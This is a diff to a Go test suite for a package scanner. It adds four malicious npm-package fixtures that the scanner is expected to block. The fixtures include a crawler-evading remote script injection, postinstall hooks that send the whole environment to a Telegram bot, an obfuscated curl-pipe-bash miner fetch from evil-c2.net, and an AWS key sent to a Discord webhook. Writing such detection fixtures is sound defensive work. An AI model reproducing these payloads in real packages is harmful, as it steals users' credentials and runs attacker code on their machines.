@@ -372,6 +372,93 @@ var realWorldCorpus = []PackageTestCase{
 		ExpectBlock: true,
 		MinTPScore:  0.90,
 	},
+	{
+		Name:        "polyfill-cdn-dynamic-injection",
+		Category:    "malicious",
+		Description: "Polyfill.io supply chain attack dynamically injecting script tag with user-agent evasion",
+		Manifest: `{
+			"name": "polyfill-fast-cdn",
+			"version": "1.0.0",
+			"main": "index.js"
+		}`,
+		Files: map[string]string{
+			"index.js": `
+				if (!/Googlebot|Bingbot/i.test(navigator.userAgent)) {
+					var s = document.createElement('script');
+					s.src = "https://kuur.link/analytics.js";
+					document.head.appendChild(s);
+				}
+			`,
+		},
+		ExpectBlock: true,
+		MinTPScore:  0.70,
+	},
+	{
+		Name:        "telegram-credential-stealer",
+		Category:    "malicious",
+		Description: "Package harvesting environment variables and sending via Telegram bot API",
+		Manifest: `{
+			"name": "env-sync-helper",
+			"version": "0.1.0",
+			"scripts": { "postinstall": "node sync.js" }
+		}`,
+		Files: map[string]string{
+			"sync.js": `
+				const https = require('https');
+				const data = JSON.stringify({ chat_id: "12345", text: JSON.stringify(process.env) });
+				const req = https.request("https://api.telegram.org/bot123456:ABC-DEF/sendMessage", {
+					method: "POST",
+					headers: { "Content-Type": "application/json" }
+				});
+				req.write(data);
+				req.end();
+			`,
+		},
+		ExpectBlock: true,
+		MinTPScore:  0.85,
+	},
+	{
+		Name:        "string-array-obfuscated-backdoor",
+		Category:    "malicious",
+		Description: "String array dictionary table obfuscation concealing child_process execution",
+		Manifest: `{
+			"name": "analytics-telemetry-core",
+			"version": "3.0.1",
+			"scripts": { "postinstall": "node ./setup.js" }
+		}`,
+		Files: map[string]string{
+			"setup.js": `
+				var _0x9812 = ['child_process', 'exec', 'curl -sL https://evil-c2.net/miner.sh | bash'];
+				var cp = require(_0x9812[0]);
+				cp[_0x9812[1]](_0x9812[2]);
+			`,
+		},
+		ExpectBlock: true,
+		MinTPScore:  0.90,
+	},
+	{
+		Name:        "bracket-notation-env-harvester",
+		Category:    "malicious",
+		Description: "Bracket property notation evasion harvesting AWS keys to Discord webhook",
+		Manifest: `{
+			"name": "aws-config-helper",
+			"version": "1.2.0",
+			"main": "index.js"
+		}`,
+		Files: map[string]string{
+			"index.js": `
+				const https = require('https');
+				const stolenKey = process['env']['AWS_SECRET_ACCESS_KEY'];
+				if (stolenKey) {
+					const req = https.request('https://discord.com/api/webhooks/123/xyz', { method: 'POST' });
+					req.write(JSON.stringify({ key: stolenKey }));
+					req.end();
+				}
+			`,
+		},
+		ExpectBlock: true,
+		MinTPScore:  0.80,
+	},
 }
 
 func TestRealWorldCorpusEfficacy(t *testing.T) {
